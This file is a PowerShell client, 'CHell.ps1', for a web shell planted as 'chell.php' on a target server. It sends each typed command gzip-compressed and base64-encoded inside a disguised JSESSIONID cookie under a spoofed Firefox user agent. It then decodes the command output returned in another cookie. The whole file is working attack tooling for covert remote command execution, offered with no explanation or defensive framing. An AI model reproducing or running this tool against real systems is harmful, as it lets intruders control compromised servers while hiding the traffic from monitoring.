if ($args.Count -ne 1) {
    Write-Host "CHell.ps1 http://target/chell.php"
} else {
    Write-host "Press <CTRL+C> to exit." -ForegroundColor Red
    while ($true) {
        Write-Host "CHELL>" -ForegroundColor Green -NoNewline
        $cmd = Read-Host 
        $b64 = $cmd |foreach-object {
            $ms = New-Object System.IO.MemoryStream
            $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
            $sw = New-Object System.IO.StreamWriter($cs)
            $sw.Write($_)
            $sw.Close()
            [System.Convert]::ToBase64String($ms.ToArray())
        }
        $url = $args[0]
        $site = $url.Split("/")[2]
        $cookie = New-Object System.Net.Cookie 
        $cookie.Name = "JSESSIONID"
        $cookie.Value = $b64
        $cookie.Domain = $site
        $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
        $session.Cookies.Add($cookie)
        $request = Invoke-WebRequest $url -WebSession $session -UserAgent "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" -DisableKeepAlive
        $cookieback = $session.Cookies.GetCookies($url)
        foreach ($cb in $cookieback) {
            if ($cb.Value -ne $b64) {
                $compressedBytes = [System.Convert]::FromBase64String($cb.Value.Replace("%3D","=").Replace("%2F","/").Replace("%2B","+"))
                $ms = New-Object System.IO.MemoryStream
                $ms.write($compressedBytes, 0, $compressedBytes.Length)
                $ms.Seek(0,0) | Out-Null
                $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
                $sr = New-Object System.IO.StreamReader($cs)
                $curline = $sr.ReadToEnd()
                Write-Host $curline  
            }
        }
        write-host    
    }
}
